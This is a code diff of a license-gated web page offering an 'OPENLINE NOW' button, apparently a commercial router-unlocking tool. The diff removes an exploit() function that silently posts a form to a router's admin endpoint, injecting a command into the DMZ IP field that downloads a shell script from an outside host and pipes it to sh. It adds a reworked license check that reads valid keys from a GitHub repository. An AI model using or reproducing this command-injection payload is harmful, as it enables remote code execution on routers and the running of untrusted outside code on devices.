@@ -44,58 +44,36 @@
   <button id="mainButton" onclick="exploit()">OPENLINE NOW</button>
 
   <script>
-    async function checkLicense() {
-      const inputKey = document.getElementById("licenseInput").value.trim();
-      const message = document.getElementById("message");
-
-      if (!inputKey) {
-        message.textContent = "❌ Please enter a license key.";
-        return;
-      }
-
-      try {
-        const res = await fetch("https://raw.githubusercontent.com/bjchack/license-store/main/license.json");
-        const data = await res.json();
-        const content = atob(data.content); // decode base64
-        const validKeys = JSON.parse(content);
-
-        if (validKeys.includes(inputKey)) {
-          message.textContent = "✅ License accepted!";
-          document.getElementById("mainButton").style.display = "block";
-          document.getElementById("licenseInput").disabled = true;
-        } else {
-          message.textContent = "❌ Invalid license key.";
-        }
-      } catch (err) {
-        message.textContent = "❌ Failed to fetch license file.";
-        console.error(err);
-      }
-    }
-
-    function exploit() {
-      const form = document.createElement("form");
-      form.method = "POST";
-      form.action = "http://192.168.254.254/goform/goform_set_cmd_process";
-      form.style.display = "none";
-
-      const fields = {
-        goformId: "DMZ_SETTING",
-        isTest: "false",
-        DMZEnabled: "1",
-        DMZIPAddress: "127.0.0.1 | curl http://junjuncruzit.online/zlt-bjc/zlt-ais1.sh -o - | sh &"
-      };
-
-      for (let name in fields) {
-        const input = document.createElement("input");
-        input.type = "hidden";
-        input.name = name;
-        input.value = fields[name];
-        form.appendChild(input);
-      }
-
-      document.body.appendChild(form);
-      form.submit();
-    }
+  async function checkLicense() {
+  const inputKey = document.getElementById("licenseInput").value.trim();
+  const message = document.getElementById("message");
+  
+  if (!inputKey) {
+  message.textContent = "❌ Please enter a license key.";
+  return;
+  }
+  
+  const apiUrl = "https://api.github.com/repos/bjchack/license-store/contents/license.json";
+  
+  try {
+  const response = await fetch(apiUrl);
+  const data = await response.json();
+  
+  const content = atob(data.content); // Decode base64
+  const validKeys = JSON.parse(content);
+  
+  if (validKeys.includes(inputKey)) {
+  message.textContent = "✅ License accepted!";
+  document.getElementById("mainButton").style.display = "block";
+  document.getElementById("licenseInput").disabled = true;
+  } else {
+  message.textContent = "❌ Invalid license key.";
+  }
+  } catch (error) {
+  console.error(error);
+  message.textContent = "❌ Failed to fetch license file.";
+  }
+  }
   </script>
 </body>
 </html>
